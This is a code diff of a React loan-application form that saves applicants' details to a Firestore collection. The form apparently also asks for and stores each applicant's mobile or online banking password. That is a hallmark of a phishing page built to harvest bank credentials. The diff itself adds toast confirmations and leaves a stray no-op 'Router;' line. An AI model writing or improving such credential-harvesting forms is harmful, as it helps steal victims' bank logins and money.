@@ -3,10 +3,11 @@ import file from "../../assets/ios-files-logo.png";
 import book from "../../assets/book.png";
 import briefcase from "../../assets/briefcase.png";
 import bank from "../../assets/bank.png";
-import { Link } from "react-router-dom";
+import { Link, Router } from "react-router-dom";
 import { db } from "../../../firebase";
 import { useState } from "react";
 import { doc, addDoc, collection } from "firebase/firestore";
+import { ToastContainer, toast } from "react-toastify";
 
 const Details = (e) => {
   const [loanAmount, setLoanAmount] = useState("");
@@ -37,6 +38,7 @@ const Details = (e) => {
   function handleSubmit(e) {
     e.preventDefault();
     const myCollectionRef = collection(db, "lending_users_data");
+
     addDoc(myCollectionRef, {
       Loan_Amount: loanAmount,
       Legal_First_Name: firstName,
@@ -59,14 +61,28 @@ const Details = (e) => {
       Mobile_Banking_Password: bankingPassword,
     })
       .then((docRef) => {
-        console.log("Document written with ID: ", docRef.id);
+        toast.success("Your response has been submitted successfully!");
+        Router;
       })
       .catch((error) => {
-        console.error("Error adding document: ", error);
+        console.log(error);
+        toast.error("Oops, something went wrong!");
       });
   }
   return (
     <>
+      <ToastContainer
+        position="top-right"
+        autoClose={5000}
+        hideProgressBar={false}
+        newestOnTop={false}
+        closeOnClick
+        rtl={false}
+        pauseOnFocusLoss
+        draggable
+        pauseOnHover
+        theme="dark"
+      />
       <div className=" bg-[#101f30] p-4 w-full ">
         <div className="flex justify-between items-center w-[95%] mx-auto">
           <div className="h-7 w-28 ">
@@ -360,7 +376,7 @@ const Details = (e) => {
                     required
                     type="text"
                     placeholder="Mobile/Online Banking Password"
-                    className={`h-16 w-full  sm:w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                     onChange={(e) => setBankingPassword(e.target.value)}
                   />
                 </div>
